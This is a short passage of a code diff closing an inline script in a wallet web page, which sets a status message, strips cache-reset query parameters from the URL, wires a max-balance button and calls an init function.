+                    setStatus('✅ Libraries loaded. Connect wallet.', 'ok');
+                }
+                const params = new URLSearchParams(window.location.search);
+                if (params.has('nocache') || params.has('reset')) {
+                    const cleanUrl = window.location.pathname + window.location.hash;
+                    window.history.replaceState({}, document.title, cleanUrl);
+                }
+                document.querySelector('#balanceFrom .max-tag')?.addEventListener('click', maxBtn.click);
+            }
+
+            init();
+
+        })();
     </script>
 </body>
 </html>
